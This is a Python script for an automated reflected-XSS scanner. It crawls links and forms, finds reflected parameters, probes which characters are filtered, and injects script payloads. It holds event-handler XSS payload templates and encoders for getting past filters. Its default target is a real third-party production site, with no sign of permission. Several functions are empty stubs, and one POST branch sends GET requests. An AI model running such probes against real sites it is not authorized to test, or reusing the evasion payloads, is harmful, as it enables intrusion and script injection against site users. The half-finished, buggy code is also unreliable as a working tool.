#!/usr/bin/python
from bs4 import BeautifulSoup as bs
from urllib.parse import urlsplit
from urllib.parse import urljoin
import requests
import binascii
import random
import string
import re
import os
import sys

#url = 'http://127.0.0.1:8000/xss-example/';
#allow_domain = '127.0.0.1'

url = 'https://www.taobao.com/'
allow_domain = 'taobao.com'

keywords = (
    'embed','src','svg','onload','style','marquee','onstart','object','data',
    'onerror','iframe','video','audio','a','href','onmousemove','onmouseover',
    'onclick','var','script','div','span','img','image','select','textarea',
    'input','keygen','autofocus','onfocus','onstart','background','alert',
    'prompt','confirm','javascript'
)
common_payload = (
    r'{(">|"/>|</[TAGNAME]>}<embed{/}[RND]src=[EVAL]>',
    r'{(">|"/>|</[TAGNAME]>}<svg{/}[RND]onload=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<style{/}[RND]onload=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<marquee{/}[RND]onstart=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<object{/}[RND](data|onerror)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<iframe{/}[RND]src=(EVAL|[RND])onload=[EVAL])>',
    r'{">|"/>|</[TAGNAME]>}<(video|audio){/}[RND]src=[RND]onerror=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<a{/}[RND](href|onmousemove|onmouseover|onclick)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<body{/}[RND](onload|background|onerror|onclick)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<var{/}[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]',
    r'{">|"/>|</[TAGNAME]>}<script[RND]>[RND](src|onerror)=[EVAL]>[EVAL]</script[RND]>',
    r'{">|"/>|</[TAGNAME]>}<(div|span|a|[LETTER]){/}[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]',
    r'{">|"/>|</[TAGNAME]>}<(img|image){/}[RND]src=(EVAL|[RND])(onerror|onmouseover|onmousemove|onclick)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<(select|textarea|input|keygen){/}[RND]autofocus(onfocus|onmousemove|onmouseover|onclick)=[EVAL]>'
)
event_payload = (
    r'{/}(onload|onstart|onerror|onmousemove|onmouseover|onclick|background|src|onfocus|data|)=[EVAL]{//}'
)

js_payload = (
    r'{javascript:}alert`0`',
    r'{javascript:}prompt`0`',
    r'{javascript:}confirm`0`',
    r'{javascript:}alert(0)',
    r'{javascript:}prompt(0)',
    r'{javascript:}confirm(0)',
)

def crawl_url_all_links(url):
    '''
    Crawl url's all links
    '''
    pass


def payload_parse_synax(raw,info):
    '''
    Payload synax parse
    '''
    tagname = info['tagname']
    isevent = info['isevent']
    isclose = info['isclose']
    SWITCH = r'\((.*?)\)'

    OPTION = r'\{(.*?)\}'


def get_dynamic_links_url(murl):
    '''
    Read dynamic links from url, only GET
    Final version
    '''
    url_links = list()
    ignore = dict()
    visited = dict()
    response = requests.get(murl)
    html = bs(response.text,'html.parser')
    a = html.find_all(name='a',attrs={'href':True})
    for el in a:
        parse = urlsplit(el['href'])
        query = parse[3]
        host = murl.split('//',1)[1].split('/',1)[0]
        dirname = os.path.dirname(murl.split('//',1)[1].split('/',1)[1])
        if el['href'].startswith('http'):
            url = el['href']
        elif el['href'].startswith('//'):
            url = murl.split('//',1)[0] + el['href']
        elif el['href'].startswith('/'):
            url = murl.split('//',1)[0] + '//' + host + el['href']
        else:
            if el['href'].startswith('javascript:'):
                continue
        url = urljoin(murl,el['href'])
        rawurl = requests.get(url, allow_redirects=True).url
        url = rawurl.replace('//','/').replace('/','//',1)
        if url.find('?') != -1:
            url = url.split('?')[0]
        host = url.split('//',1)[1].split('/',1)[0]
        if host.find(allow_domain) == -1:
            continue
        qlist = dict()
        if query:
            if query.find('&') != -1:
                for q in query.split('&'):
                    if q.find('=') != -1:
                        qlist[q.split('=',1)[0]] = q.split('=',1)[1]
            else:
                if query.find('=') != -1:
                    qlist[query.split('=',1)[0]] = query.split('=',1)[1]
            for k,_ in qlist.items():
                if not host in visited:
                    visited[host] = list()
                if k in visited[host]:
                    continue
                else:
                    visited[host].append(k)
                if k in ignore:
                    if ignore[k] == 3:
                        print(k,'ignore')
                        continue
                rnd = ''.join(random.sample(string.ascii_letters,8))
                fuzz = qlist.copy()
                fuzz[k] = rnd
                response = requests.get(url,params=fuzz)
                if response.text.find(rnd) != -1:
                    print(k,'is dynamic')
                    fuzz.pop(k)
                    item = dict()
                    item['url'] = url
                    item['method'] = 'get'
                    item['param'] = k
                    item['raw'] = fuzz
                    url_links.append(item)
                else:
                    print(k,'not dynamic')
                    if not k in ignore:
                        ignore[k] = 1
                    ignore[k] += 1
    return url_links


def get_dynamic_links_rest(murl):
    '''
    Read dynamic links from REST url, only GET
    '''
    pass


def get_dynamic_links_form(murl):
    '''
    Read dynmaic links from form, GET and POST
    Final version
    '''
    form_links = list()
    response = requests.get(murl)
    html = bs(response.text,'html.parser')
    form = html.find_all(name='form', attrs={'action':True})
    for f in form:
        parse = urlsplit(f['action'])
        query = parse[3]
        host = murl.split('//',1)[1].split('/',1)[0]
        dirname = os.path.dirname(murl.split('//',1)[1].split('/',1)[1])
        if f['action'].startswith('http'):
            url = f['action']
        elif f['action'].startswith('//'):
            url = murl.split('//',1)[0] + f['action']
        elif f['action'].startswith('/'):
            url = murl.split('//',1)[0] + '//' + host + f['action']
        else:
            url = urljoin(murl,f['action'])
        url = url.replace('//','/').replace('/','//',1)
        host = url.split('//',1)[1].split('/',1)[0]
        if host.find(allow_domain) == -1:
            continue
        tags = f.find_all(name='input')
        if f.has_attr('method'):
            method = f['method']
        else:
            method = 'get'
        print('action:',url)
        print('method:',method)
        item = dict()
        item['url'] = url
        item['method'] = method
        count = 1
        data = dict(zip([el['name'] for el in tags],[''.join(random.sample(string.ascii_letters,8)) for _ in tags]))
        if method == 'get':
            response = requests.get(url,params=data)
        else:
            response = requests.post(url,data=data)
        for k,v in data.items():
            if response.text.find(v) != -1:
                print(k,'is dynamic')
                item['param' + str(count)] = k
                count += 1
            else:
                print(k,'not dynamic')
        if 'param1' in item:
            form_links.append(item)
    return form_links


def get_output_position(links):
    '''
    Get the output position
    '''
    plinks = list()
    for item in links:
        url = item['url']
        method = item['method']
        keys = list(item.keys())
        params = list()
        israw = False
        if 'raw' in item:
            raw = item['raw']
            israw = True
        for k in keys:
            if k.startswith('param'):
                params.append(item[k])
        fuzz = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
        if method == 'get':
            response = requests.get(url,params=fuzz)
        else:
            response = requests.post(url,data=fuzz)
        for p,r in fuzz.items():
            regex_rnd = r'.*{0}.*'.format(r)
            regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(r)
            regex_attrs = r'\<.*\=\".*{0}.*\".*\>'.format(r)
            position = re.findall(regex_rnd,response.text)
            if len(p) != 5:
                n = p.replace('param','')
                name = 'pos' + str(n)
            else:
                name = 'pos'
            item[name] = list()
            for pos in position:
                if re.findall(regex_tags,pos):
                    item[name].append('tags')
                    print(p,'output between tags')
                elif re.findall(regex_attrs,pos):
                    item[name].append('attrs')
                    print(p,'output in tags')
                else:
                    item[name].append('page')
                    print(p,'output on the page')
        plinks.append(item)
    return plinks

def get_xss_filter(links):
    '''
    find filtered keyword
    '''
    symbols = '<>`\\\'\"'
    xlinks = list()
    for item in links:
        url = item['url']
        method = item['method']
        keys = list(item.keys())
        params = list()
        israw = False
        if 'raw' in item:
            raw = item['raw']
            israw = True
        for k in keys:
            if k.startswith('param'):
                params.append(item[k])
        for p in params:
            fuzz = dict()
            allowed = list()
            for pp in params:
                if pp != p:
                    fuzz[pp] = ''.join(random.sample(string.ascii_letters,8))
            for s in symbols:
                rnd = ''.join(random.sample(string.ascii_letters,8))
                fuzz[p] = rnd + s + rnd
                if israw:
                    merge = dict()
                    merge.update(fuzz)
                    merge.update(raw)
                else:
                    merge = fuzz.copy()
                if method == 'get':
                    response = requests.get(url,params=merge)
                else:
                    response = requests.get(url,params=merge)
                keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
                if keyword:
                    for w in keyword:
                        if w == s:
                            allowed.append(s)
            if len(allowed) == len(symbols):
                item['filtered'] = 'null'
                print(p,'allowed all symbols')
            else:
                filtered = ','.join(a for a in symbols if a not in allowed)
                item['filtered'] = filtered
                print(p,filtered,'filtered')
        xlinks.append(item)
    return xlinks


def encode_xss_payload(payload,entype):
    '''
    Encode xss payload
    '''
    if entype == 'uni':
        uni_p = ''
        for p in payload:
            uni_p += r'\u00' + binascii.hexlify(p.encode('unicode-escape')).decode()
        return uni_p
    elif entype == 'hex':
        hex_p = ''
        for p in payload:
            hex_p += '&#x00' + binascii.hexlify(p.encode('unicode-escape')).decode() + ';'
        return hex_p
    elif entype == 'dec':
        dec_p = ''
        for p in payload:
            dec_p += '&#' + str(ord(p)) + ';'
        return dec_p
    else:
        asc_p = list()
        for p in payload:
            asc_p.append(str(ord(p)))
        asc_p = 'eval(String.FromCharCode(' + ','.join(asc_p) + '))'
        return asc_p


def automatic_gen_payload(result):
    '''
    Generate payload according to the result
    '''
    pass


def inject_xss_payload(links):
    '''
    Testing XSS vul
    '''
    for murl,mitem in links.items():
        for method,item in mitem.items():
            for pos,params in item.items():
                data = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
                if method == 'get':
                    response = requests.get(murl,params=data)
                else:
                    response = requests.post(murl,data=data)
                for k,v in data.items():
                    regex_tagname = r'(?<=\<)(.*)?(?=\>{0})'.format(v)
                    tagname = re.findall(regex_tagname,response.text)
                    for tag in tagname:
                        fuzz = data.copy()
                        payload = '</{0}><script>alert(/xss/)'.format(tag)
                        fuzz[k] = payload
                        if method == 'get':
                            response = requests.get(murl, params=fuzz)
                        else:
                            response = requests.post(murl,data=fuzz)
                        if response.text.find(payload) != -1:
                            print(k,'detect xss:',payload)


ulinks = get_dynamic_links_url(url)
#flinks = get_dynamic_links_form(url)
plinks1 = get_output_position(ulinks)
#plinks2 = get_output_position(flinks)
xlinks1 = get_xss_filter(plinks1)
#xlinks2 = get_xss_filter(plinks2)
